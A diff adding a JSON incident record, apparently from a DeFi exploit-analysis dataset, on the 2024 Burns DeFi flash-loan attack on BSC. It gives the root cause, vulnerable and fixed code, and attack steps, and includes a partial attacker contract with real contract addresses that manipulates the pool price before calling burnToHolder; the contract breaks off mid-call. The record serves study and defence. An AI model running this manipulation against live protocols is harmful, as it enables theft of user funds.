@@ -1,0 +1,36 @@
+{
+ "id": "2024__2024-02-12_BurnsDefi_FlashLoanBurnToHolder",
+ "source_file": "2024/2024-02-12_BurnsDefi_FlashLoanBurnToHolder.md",
+ "title": "Burns DeFi — Flash Loan-Based burnToHolder Price Manipulation Analysis",
+ "date": "2024-02-12",
+ "protocol": "Burns DeFi",
+ "chain": "BSC",
+ "loss_raw": "~$67,000",
+ "loss_usd": 67000.0,
+ "root_cause": "The `burnToHolder()` function uses a spot reserve-based price from DEX pair `getReserves()`, allowing reserve manipulation within a single block to receive excess reward tokens",
+ "attack_tx": null,
+ "vulnerable_contract": "BurnsBuild 0x4fb9657A",
+ "classes": [
+  "flash-loan"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: reward calculation based on pair spot price\nfunction burnToHolder(uint256 amount, address holder) external {\n    (uint112 r0, uint112 r1,) = pair.getReserves();\n    // Spot reserve-based price calculation — manipulable via flash loan\n    uint256 burnPrice = uint256(r0) * 1e18 / uint256(r1);\n    uint256 reward = amount * burnPrice / 1e18;\n    pendingRewards[holder] += reward;\n}\n\n//",
+  "// File: BurnsDefi_decompiled.sol\ncontract BurnsDefi {\n    function burnToHolder(uint256 p0, address p1) external {}  // ❌ Vulnerability"
+ ],
+ "code_after": [
+  "✅ Safe code: use TWAP-based price\nfunction burnToHolder(uint256 amount, address holder) external {\n    uint256 burnPrice = getTWAPPrice(1800); // 30-minute TWAP\n    uint256 reward = amount * burnPrice / 1e18;\n    pendingRewards[holder] += reward;\n}"
+ ],
+ "steps": [
+  "→ [1] flash: 250,000 BUSDT flash loan",
+  "→ [2] BUSDT → WBNB → Burns swap (price manipulation)",
+  "→ [3] burnToHolder(large amount) called 2x",
+  "→ [4] receiveRewards() called → excessive rewards collected",
+  "→ [5] WBNB → BUSDT reverse swap",
+  "→ Burns → BUSDT swap",
+  "→ [6] Flash loan repaid + ~$67K profit"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─→ [1] flash: 250,000 BUSDT flash loan\n  │\n  ├─→ [2] BUSDT → WBNB → Burns swap (price manipulation)\n  │\n  ├─→ [3] burnToHolder(large amount) called 2x\n  │         └─ rewards accumulate at manipulated spot price\n  │\n  ├─→ [4] receiveRewards() called → excessive rewards collected\n  │\n  ├─→ [5] WBNB → BUSDT reverse swap\n  │   └─→ Burns → BUSDT swap\n  │\n  └─→ [6] Flash loan repaid + ~$67K profit",
+  "interface IBurnsBuild {\n    function burnToHolder(uint256 amount, address holder) external;\n    function receiveRewards(address holder) external;\n}\n\ncontract AttackContract {\n    IBurnsBuild constant burns = IBurnsBuild(0x4fb9657Ac5d311dD54B37A75cFB873b127Eb21FD);\n    IERC20 constant BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);\n\n    function DPPFlashLoanCall(address, uint256, uint256, bytes calldata) external {\n        // [1] BUSDT → WBNB → Burns swap (price manipulation)\n        swapBUSDTToWBNBToBurns(250_000e18);\n\n        // [2] burnToHolder called 2x (rewards accumulate at manipulated price)\n        burns.burnToHolder(burnsBalance / 2, address(this));\n        burns.burnToHolder(burnsBalance / 2, address(this));\n\n        // [3] Collect rewards\n        burns.receiveRewards("
+ ]
+}
